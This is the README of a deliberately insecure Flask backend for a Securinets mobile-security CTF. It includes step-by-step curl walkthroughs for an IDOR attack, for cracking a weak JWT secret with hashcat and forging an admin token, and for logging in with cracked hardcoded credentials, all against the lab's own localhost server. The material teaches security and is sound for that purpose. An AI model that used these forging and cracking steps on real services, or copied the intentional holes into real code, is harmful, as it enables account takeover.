# Securinets CTF Backend

A deliberately-insecure Flask backend for teaching mobile security vulnerabilities via live MITM-proxy and certificate pinning exercises.

## Embedded Flags

1. **`Securinets{<see secrets/flags.json #9>}`** — in `session_note` field of `/login` response (sniffable over plain HTTP)
2. **`Securinets{<see secrets/flags.json #10>}`** — in `internal_ref` of user id=4's `/profile` (IDOR vulnerability)
3. **`Securinets{<see secrets/flags.json #11>}`** — in `note` field of `/audit` response (requires certificate pinning bypass)
4. **`Securinets{<see secrets/flags.json #12>}`** — in `flag` field of `/admin/report`, reached by cracking `JWT_SECRET` offline and minting a fresh admin token
5. **`Securinets{<see secrets/flags.json #1>}`** — in `notice` field of `/activate`, reached with the cracked NomadVpn credentials (#1)
6. **`Securinets{<see secrets/flags.json #14>}`** — in `sync_token` field of the rogue SDK collector's `/collect` response (#14, see `rogue_sdk_collector.py`)

## Request signing (X-Sig)

`/login`, `/profile/<id>` and `/audit` require an `X-Sig` header —
`HMAC-SHA256(K, message)`, lowercase hex — where `K` is the 32-byte key in
`SIG_KEY` (env `CTF_SIG_KEY`, default committed in `app.py`) and `message`
differs **per endpoint on purpose** (see the docstrings in `app.py` and
`docs/CHALLENGE-AUDIT-2026-09-11.md`):

| Endpoint | Signed message |
|---|---|
| `POST /login` | raw request body bytes |
| `GET /profile/<id>` | bearer token string (path excluded) |
| `GET /audit` | bearer token string + literal `/audit` (path included) |
| `GET /admin/report`, `POST /activate` | none |

Use `testing/sign_request.py` to compute a signature from the command line.
Set `CTF_SIG_DISABLED=1` to turn signature checking off entirely (designer
mode — env/argv only, never request-controlled).

## Setup

### Install dependencies

```bash
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
pip install -r requirements.txt
```

### Generate certificates (if not present)

The repository includes pre-generated certificates in `certs/`. To regenerate:

```bash
cd certs
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 3650 -nodes -subj "/CN=localhost"
```

## Running the Backend

### Plain HTTP mode (sniffable)

```bash
python app.py --http --port 8000
```

The server listens on `http://0.0.0.0:8000`.

### HTTPS mode (with certificate pinning)

```bash
python app.py --https --port 8443
```

The server listens on `https://0.0.0.0:8443` using the self-signed certificate in `certs/`.

### Rogue SDK Collector (target #14 only)

Run alongside `app.py` in a separate terminal on a different port:

```bash
python rogue_sdk_collector.py --port 9090
```

The server listens on `http://0.0.0.0:9090` and accepts POST requests to `/collect`. This is
intentionally a *distinct host:port* from the main backend so the player can identify
it as a third-party service in a proxy capture. In a real scenario, this would be a
domain like `api.metricflow.com` — for local testing, `localhost:9090` serves the same purpose.

A well-formed telemetry payload (`device_id`, `install_id`, `event`) gets back a
`sync_token` field carrying the flag; this is the *only* place the #14 flag exists —
nothing flag-related ships in the APK. This collector is on the same pre-event
checklist as `:8000`/`:8443`; a dead collector silently zeroes out challenge #14
with no error anywhere.

### Start everything at once

```bash
./start_all.sh
```

Starts all three services (`:8000`, `:8443`, `:9090`) and stops them together on
Ctrl-C. Pass `CTF_SIG_DISABLED=1 ./start_all.sh` for designer mode.

## Seed Users

Ten hardcoded users (no database). The "player" account (id=6) is the one the Android app logs in as:

| ID  | Username | Password      | Name                | Email                | Internal Ref                                              |
|-----|----------|---------------|-------------------|----------------------|-----------------------------------------------------------|
| 1   | alice    | alice123      | Alice Johnson      | alice@example.com   | REF-2024-88201                                           |
| 2   | bob      | bob456        | Bob Smith          | bob@example.com     | a3f9c210e7                                               |
| 3   | charlie  | charlie789    | Charlie Brown      | charlie@example.com | REF-2024-88202                                           |
| 4   | diana    | diana999      | Diana Prince       | diana@example.com   | **Securinets{<see secrets/flags.json #10>}** ⚠️ |
| 5   | eve      | eve111        | Eve Wilson         | eve@example.com     | REF-2024-88203                                           |
| 6   | player   | player123     | Player Account     | player@example.com  | REF-2024-88204                                           |
| 7   | frank    | frank222      | Frank Miller       | frank@example.com   | b7d4e2f1a9                                               |
| 8   | grace    | grace333      | Grace Lee          | grace@example.com   | REF-2024-88205                                           |
| 9   | henry    | henry444      | Henry Taylor       | henry@example.com   | c2e8f5b1d3                                               |
| 10  | iris     | iris555       | Iris Clark         | iris@example.com    | REF-2024-88206                                           |

## Certificate Pin

If running in HTTPS mode, the OkHttp certificate pin for `CertificatePinner` configuration is:

```
sha256/VUBzfVMS2vYI/k9CnmZaFPrqpAwNgqPx2j6WvfAcs+E=
```

This pin is also saved in `certs/okhttp_pin.txt`. It was regenerated 2026-09-11 when the
cert's SAN moved from the old LAN IP (`192.168.240.1`) to the placeholder public hostname
`ctf.securinets.tn` (organizer-hosted VPS deployment decision) — any future cert regen
must update this pin and the app's `CERT_PIN` together, or #11 breaks outright.

## API Endpoints

### 1. GET /health (no auth)

Health check endpoint.

```bash
curl http://localhost:8000/health
```

Response:
```json
{"status": "ok"}
```

---

### 2. POST /login (no auth)

Authenticate and receive a JWT token.

```bash
BODY='{"username": "player", "password": "player123"}'
curl -X POST http://localhost:8000/login \
  -H "Content-Type: application/json" \
  -H "X-Sig: $(python3 testing/sign_request.py login "$BODY")" \
  -d "$BODY"
```

Response (with embedded flag — sniffable over plain HTTP):
```json
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOjYsInVzZXJuYW1lIjoicGxheWVyIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2OTQ0MTIzMjAsImV4cCI6MTY5NDQ5ODcyMH0.nB1d0vLz4QrQ3vPQfK2R5qC3S8dB9sJ7tN2mK4lA5pY",
  "session_note": "Securinets{<see secrets/flags.json #9>}"
}
```

Invalid credentials:

```bash
curl -X POST http://localhost:8000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "player", "password": "wrongpassword"}'
```

Response: `{"error": "Invalid credentials"}` (401)

---

### 3. GET /profile/<id> (auth required, IDOR vulnerability)

Fetch a user's profile. **VULNERABILITY**: The server accepts ANY valid JWT and doesn't check ownership.

```bash
# Login first to get a token
BODY='{"username": "player", "password": "player123"}'
TOKEN=$(curl -s -X POST http://localhost:8000/login \
  -H "Content-Type: application/json" \
  -H "X-Sig: $(python3 testing/sign_request.py login "$BODY")" \
  -d "$BODY" | jq -r '.token')

# Fetch your own profile (id=6, the player account)
PSIG=$(python3 testing/sign_request.py profile "$TOKEN")
curl -H "Authorization: Bearer $TOKEN" -H "X-Sig: $PSIG" http://localhost:8000/profile/6
```

Response:
```json
{
  "id": 6,
  "name": "Player Account",
  "email": "player@example.com",
  "internal_ref": "REF-2024-88204"
}
```

**IDOR attack**: Fetch another user's profile using the same token — reuse the same `PSIG`,
since the signature deliberately does not cover the path:

```bash
curl -H "Authorization: Bearer $TOKEN" -H "X-Sig: $PSIG" http://localhost:8000/profile/4
```

Response (flag in `internal_ref`):
```json
{
  "id": 4,
  "name": "Diana Prince",
  "email": "diana@example.com",
  "internal_ref": "Securinets{<see secrets/flags.json #10>}"
}
```

---

### 4. GET /audit (auth required)

Audit log endpoint. Returns a flag in the `note` field. The Android client is expected to have certificate pinning; intercepting/bypassing it is the exercise.

```bash
ASIG=$(python3 testing/sign_request.py audit "$TOKEN")
curl -H "Authorization: Bearer $TOKEN" -H "X-Sig: $ASIG" http://localhost:8000/audit
```

Response:
```json
{
  "report": "Q3 access log — 14 anomalies flagged",
  "note": "Securinets{<see secrets/flags.json #11>}"
}
```

Note `ASIG` is bound to the literal path `/audit` — replaying `PSIG` from the `/profile`
call above here gets a 401, which is the point (see docs/CHALLENGE-AUDIT-2026-09-11.md #11).

---

### 5. GET /admin/report (auth required, HS256 signature IS verified)

**REDESIGNED 2026-09-11.** The old version decoded the JWT without checking its
signature, so forging `role: "admin"` was a free base64 edit. It now verifies the
signature with `JWT_SECRET` and only trusts `role` from a token that passed
verification. `JWT_SECRET = "changeme"` — a plausible dev leftover that is
genuinely present in `rockyou.txt` (confirmed, line 3904) — so the intended path is
crack the secret offline, then mint your own valid admin token.

Get your own token (role: "user") and confirm it is refused:

```bash
TOKEN=$(curl -s -X POST http://localhost:8000/login \
  -H "Content-Type: application/json" -H "X-Sig: $(python3 testing/sign_request.py login '{"username":"player","password":"player123"}')" \
  -d '{"username": "player", "password": "player123"}' | jq -r '.token')

curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/admin/report
# {"error": "admin role required"}   (403 — signature is valid, role is "user")
```

**Crack `JWT_SECRET`** with `hashcat -m 16500 <token> rockyou.txt` or
`jwt_tool -C -d rockyou.txt <token>`, then forge and re-sign a token with the
recovered secret:

```bash
FORGED=$(python3 - "$TOKEN" <<'EOF'
import sys, jwt
payload = jwt.decode(sys.argv[1], options={"verify_signature": False})
payload["role"] = "admin"
print(jwt.encode(payload, "changeme", algorithm="HS256"))
EOF
)
curl -H "Authorization: Bearer $FORGED" http://localhost:8000/admin/report
```

Response (flag achieved):
```json
{
  "report": "Full user export — 47 records",
  "flag": "Securinets{<see secrets/flags.json #12>}"
}
```

Tampering with `role` **without** re-signing with the recovered secret gets a
401 (`{"error": "Unauthorized"}`) — the signature check runs first.

---

### 6. POST /activate (no auth, #1 "Left in the Open" / NomadVpn)

```bash
curl -X POST http://localhost:8000/activate \
  -H "Content-Type: application/json" \
  -d '{"account": "nomad.admin", "key": "trustno1"}'
```

`nomad.admin` ships hardcoded in the APK in plain sight (the M1 lesson). Only an MD5
hash of the password (`5fcfd41e547a12215b173ff47fdd3739`, confirmed present as
`trustno1` in rockyou.txt) ships client-side; this endpoint verifies the cracked
plaintext server-side.

Success:
```json
{"status": "active", "notice": "Securinets{<see secrets/flags.json #1>}"}
```

Failure — byte-identical for a wrong password and an unknown account, and for a
bare POST with no body, so the username is never enumerable from the response:
```json
{"status": "denied"}
```

## End-to-End Walkthrough (curl)

Complete flow to obtain every backend-served flag. Run from `backend/` so
`testing/sign_request.py` resolves.

```bash
# 1. Start every service
./start_all.sh &

# 2. Health check
curl http://localhost:8000/health

# 3. Login (flag 1: sniffable in session_note)
BODY='{"username": "player", "password": "player123"}'
TOKEN=$(curl -s -X POST http://localhost:8000/login \
  -H "Content-Type: application/json" \
  -H "X-Sig: $(python3 testing/sign_request.py login "$BODY")" \
  -d "$BODY" | jq -r '.token')
echo "Flag 1 (sniffable over HTTP): Securinets{<see secrets/flags.json #9>}"

# 4. Fetch own profile
PSIG=$(python3 testing/sign_request.py profile "$TOKEN")
curl -H "Authorization: Bearer $TOKEN" -H "X-Sig: $PSIG" http://localhost:8000/profile/6

# 5. IDOR attack: fetch id=4 (flag 2 in internal_ref) — same PSIG, path is unsigned
curl -H "Authorization: Bearer $TOKEN" -H "X-Sig: $PSIG" http://localhost:8000/profile/4
echo "Flag 2 (IDOR): Securinets{<see secrets/flags.json #10>}"

# 6. Fetch audit (flag 3 in note) — path-bound signature, PSIG will NOT work here
ASIG=$(python3 testing/sign_request.py audit "$TOKEN")
curl -H "Authorization: Bearer $TOKEN" -H "X-Sig: $ASIG" http://localhost:8000/audit
echo "Flag 3 (cert pinning): Securinets{<see secrets/flags.json #11>}"

# 7. Try admin/report with real token (should fail, role=user, 403)
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/admin/report

# 8. Crack JWT_SECRET offline (hashcat -m 16500 / john --format=HMAC-SHA256 against
#    rockyou.txt — it recovers "changeme"), then forge+re-sign role=admin (flag 4)
FORGED=$(python3 - "$TOKEN" <<'EOF'
import sys, jwt
payload = jwt.decode(sys.argv[1], options={"verify_signature": False})
payload["role"] = "admin"
print(jwt.encode(payload, "changeme", algorithm="HS256"))
EOF
)
curl -H "Authorization: Bearer $FORGED" http://localhost:8000/admin/report
echo "Flag 4 (JWT secret crack + forgery): Securinets{<see secrets/flags.json #12>}"

# 9. #1 NomadVpn: crack the shipped MD5 (trustno1), activate (flag 5)
curl -X POST http://localhost:8000/activate -H "Content-Type: application/json" \
  -d '{"account": "nomad.admin", "key": "trustno1"}'
echo "Flag 5 (hardcoded creds + weak hash): Securinets{<see secrets/flags.json #1>}"

# 10. #14: any well-formed telemetry POST to the rogue collector returns flag 6
curl -X POST http://localhost:9090/collect -H "Content-Type: application/json" \
  -d '{"device_id": "x", "install_id": "y", "event": "app_session_start"}'
echo "Flag 6 (rogue SDK response body): Securinets{<see secrets/flags.json #14>}"
```

## Testing HTTPS Mode

To test the HTTPS endpoint and verify certificate pinning works:

```bash
python app.py --https --port 8443
```

Then curl with certificate verification disabled (for testing):

```bash
curl -k -H "Authorization: Bearer $TOKEN" -H "X-Sig: $ASIG" https://localhost:8443/audit
```

The `-k` flag disables certificate verification. In production, the Android app's `network_security_config.xml` would use certificate pinning to verify this cert, and intercepting the traffic requires the player to bypass that pinning (teaching the vulnerability).

## Code Annotations

Each vulnerability is clearly commented in `app.py`:

- **`/login`** — `session_note` is always included and visible over plain HTTP.
- **`/profile/<id>`** — No ownership check on the token's `sub` claim vs. requested `user_id`.
- **`/audit`** — Generic endpoint; the vulnerability is client-side (cert pinning).
- **`/admin/report`** — Signature **is** verified now; the vulnerability is a crackable secret.
- **`/activate`** — Vulnerability is entirely client-side (hardcoded username, weak hash); the
  endpoint's own job is to never leak the flag without the correct password.

## Known Issues / Design Notes

- **No real database**: All users are hardcoded in memory.
- **Deliberately weak secret key**: `JWT_SECRET = "changeme"` — deliberately in rockyou.txt so
  #12 is crackable. Shared with `require_auth`/`/profile` on purpose (do not split it — see
  docs/CHALLENGE-AUDIT-2026-09-11.md #12).
- **Self-signed cert**: Generated with 10-year validity. CN and SAN use the placeholder
  organizer hostname `ctf.securinets.tn` (plus `localhost`/`127.0.0.1` for local testing).
- **No rate limiting**: Endpoints are open to brute force and abuse.
- **No input validation beyond type checking**: Expected for a training backend.
- **Per-session flag derivation was considered and rejected for #9/#10** (Task 3 of the
  2026-09-11 backend brief) — there is no per-player identity anywhere in this CTF and CTFd
  expects one flag string per challenge, so the flags stay fixed literals. The sharing problem
  (first solver pastes the flag) is a CTFd/event-operations problem, not something the server
  can fix without inventing player accounts the rest of the project deliberately has none of.

## References

- JWT specification: [RFC 7519](https://tools.ietf.org/html/rfc7519)
- OWASP Mobile Top 10 (2024)
- OkHttp Certificate Pinning: [Square OkHttp Docs](https://square.github.io/okhttp/security/)
